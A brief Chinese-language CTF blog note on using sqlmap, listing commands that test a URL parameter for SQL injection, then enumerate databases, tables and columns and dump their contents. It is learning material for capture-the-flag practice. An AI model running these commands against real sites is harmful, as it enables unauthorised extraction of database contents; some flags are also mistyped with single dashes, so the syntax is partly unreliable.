---

title: sqlmap
tags: [ctf-web]
date: 2023-11-15 21:26:00
categories: [ctf-web]
excerpt: sqlmap的使用

---

判断能否注入

```shell
sqlmap -u http://.../index.php?id=1
```

查看数据库

```shell
sqlmap -u http://.../index.php?id=1 --dbs
```

查看指定数据库的表

```shell
sqlmap -u http://.../index.php?id=1 --dbs -D <dbname> -tables
```

查看指定表的列

```shell
sqlmap -u http://.../index.php?id=1 --dbs -D <dbname> -T <tablename> -columns
```

查看列内容

```shell
sqlmap -u http://.../index.php?id=1 --dbs -D <dbname> -T <tablename> -C <colname> -dump
```

